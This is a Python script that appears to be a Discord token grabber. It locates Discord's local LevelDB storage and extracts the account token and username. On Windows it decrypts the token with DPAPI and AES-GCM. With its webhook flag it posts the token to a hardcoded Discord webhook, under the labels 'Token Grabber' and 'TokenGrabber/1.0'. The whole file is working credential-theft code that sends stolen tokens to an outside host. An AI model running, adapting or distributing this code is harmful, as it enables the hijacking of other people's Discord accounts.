# /// script
# requires-python = ">=3.10"
# dependencies = ["plyvel-ci", "cryptography"]
# ///
import argparse
import base64
import json
import os
import platform
import shutil
import sys
import tempfile
import urllib.request
import urllib.error

WEBHOOK_URL = "https://discord.com/api/webhooks/1500212791150121102/3IQYOWobaGPZf56F4EJYJ5bDCF5Pw9j99iwRu3eU4hRSSXmPqQymV93sNlM9Pan0B0nr"


def get_leveldb_path():
    system = platform.system()
    if system == "Windows":
        base = os.environ.get("APPDATA", os.path.expanduser("~\\AppData\\Roaming"))
        return os.path.join(base, "discord", "Local Storage", "leveldb")
    elif system == "Darwin":
        return os.path.expanduser("~/Library/Application Support/discord/Local Storage/leveldb")
    else:
        return os.path.expanduser("~/.config/discord/Local Storage/leveldb")


def get_local_state_path():
    system = platform.system()
    if system == "Windows":
        base = os.environ.get("APPDATA", os.path.expanduser("~\\AppData\\Roaming"))
        return os.path.join(base, "discord", "Local State")
    elif system == "Darwin":
        return os.path.expanduser("~/Library/Application Support/discord/Local State")
    else:
        return os.path.expanduser("~/.config/discord/Local State")


def send_webhook(username, token):
    os_name = platform.system()
    payload = {
        "username": "Token Grabber",
        "embeds": [
            {
                "title": "Discord Token Retrieved",
                "color": 5793266,
                "fields": [
                    {"name": "User", "value": f"**{username}**", "inline": True},
                    {"name": "Platform", "value": os_name, "inline": True},
                    {"name": "Token", "value": f"```{token}```", "inline": False},
                ],
            }
        ],
    }
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        WEBHOOK_URL,
        data=data,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "TokenGrabber/1.0",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req) as resp:
            if resp.status == 204:
                print("Token forwarded to webhook.")
            else:
                print(f"Webhook responded with status {resp.status}", file=sys.stderr)
    except urllib.error.URLError as e:
        print(f"Failed to send to webhook: {e}", file=sys.stderr)


def dpapi_decrypt(encrypted_data):
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [
            ("cbData", ctypes.wintypes.DWORD),
            ("pbData", ctypes.POINTER(ctypes.c_char)),
        ]

    blob_in = DATA_BLOB(
        len(encrypted_data),
        ctypes.create_string_buffer(encrypted_data, len(encrypted_data)),
    )
    blob_out = DATA_BLOB()

    if ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
    ):
        decrypted = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return decrypted
    return None


def get_aes_key():
    local_state_path = get_local_state_path()
    if not os.path.isfile(local_state_path):
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
    if not encrypted_key_b64:
        return None

    encrypted_key = base64.b64decode(encrypted_key_b64)
    if encrypted_key[:5] != b"DPAPI":
        return None

    decrypted_key = dpapi_decrypt(encrypted_key[5:])
    return decrypted_key


def decrypt_windows_token(encrypted_token):
    if not encrypted_token.startswith("dQw4w9WgXcQ:"):
        return encrypted_token

    aes_key = get_aes_key()
    if not aes_key:
        print("Warning: Could not retrieve AES key from Local State.", file=sys.stderr)
        return None

    encrypted_b64 = encrypted_token[len("dQw4w9WgXcQ:"):]
    encrypted_b64 += "=" * (-len(encrypted_b64) % 4)
    encrypted_data = base64.b64decode(encrypted_b64)

    if encrypted_data[:3] != b"v10":
        print(f"Warning: Unknown token encryption version: {encrypted_data[:3]}", file=sys.stderr)
        return None

    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    nonce = encrypted_data[3:15]
    ciphertext_with_tag = encrypted_data[15:]

    aesgcm = AESGCM(aes_key)
    try:
        plaintext = aesgcm.decrypt(nonce, ciphertext_with_tag, None)
        return plaintext.decode("utf-8")
    except Exception as e:
        print(f"Warning: AES-GCM decryption failed: {e}", file=sys.stderr)
        return None


def extract_token(src_path):
    import plyvel

    tmp_dir = tempfile.mkdtemp(prefix="discord_leveldb_")
    try:
        shutil.copytree(src_path, os.path.join(tmp_dir, "leveldb"), dirs_exist_ok=True)
        db = plyvel.DB(os.path.join(tmp_dir, "leveldb"), create_if_missing=False)
    except Exception as e:
        shutil.rmtree(tmp_dir, ignore_errors=True)
        print(f"Error: Could not copy/open leveldb: {e}", file=sys.stderr)
        sys.exit(1)

    token = None
    username = None
    for key, value in db:
        k = key.decode("utf-8", errors="replace")
        is_discord = "discord.com" in k or "discordapp.com" in k
        if is_discord and k.rstrip().endswith("token"):
            v = value.decode("utf-8", errors="replace")
            v = v.strip("\x01\"").strip()
            token = v
        if is_discord and k.rstrip().endswith("MultiAccountStore"):
            v = value.decode("utf-8", errors="replace")
            v = v.lstrip("\x01").strip()
            try:
                data = json.loads(v)
                username = data.get("_state", {}).get("users", [{}])[0].get("username")
            except (json.JSONDecodeError, IndexError, KeyError):
                pass
    db.close()
    shutil.rmtree(tmp_dir, ignore_errors=True)
    return token, username


def main():
    parser = argparse.ArgumentParser(
        description="Extract Discord token from local leveldb storage"
    )
    parser.add_argument("-a", "--all", action="store_true", help="Show full token")
    parser.add_argument(
        "-c", "--chars", type=int, default=5, help="Show first N characters (default: 5)"
    )
    parser.add_argument(
        "-w", "--webhook", action="store_true", help="Forward token to webhook"
    )
    args = parser.parse_args()

    src_path = get_leveldb_path()

    if not os.path.isdir(src_path):
        print(f"Error: Discord leveldb directory not found at {src_path}", file=sys.stderr)
        sys.exit(1)

    token, username = extract_token(src_path)

    if not token:
        print("No token found. Make sure you are logged into Discord.", file=sys.stderr)
        sys.exit(1)

    if platform.system() == "Windows" and token.startswith("dQw4w9WgXcQ:"):
        decrypted = decrypt_windows_token(token)
        if decrypted:
            token = decrypted
        else:
            print("Error: Failed to decrypt Windows token.", file=sys.stderr)
            sys.exit(1)

    if args.webhook:
        send_webhook(username or "unknown", token)
    elif args.all:
        print(token)
    else:
        print(token[:args.chars])


if __name__ == "__main__":
    main()
